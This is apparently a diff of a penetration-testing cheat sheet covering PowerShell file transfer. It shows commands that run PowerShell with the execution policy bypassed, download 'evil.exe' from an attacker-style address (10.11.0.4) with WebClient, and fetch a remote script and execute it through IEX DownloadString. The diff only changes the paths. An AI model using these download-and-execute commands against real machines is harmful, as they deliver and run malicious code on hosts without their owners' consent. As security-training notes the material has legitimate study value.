@@ -10,9 +10,9 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 d_f.ps1
 $webclient = New-Object System.Net.WebClient
 $url = "http://10.11.0.4/evil.exe"
-$file = "new-exploit.exe"
+$file = "path\new.exe"
 $webclient.DownloadFile($url,$file)
-powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/d_f.ps1')
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('path/d_f.ps1')
 ```
 
 ### SCP Copy file from remote machine to local tmp
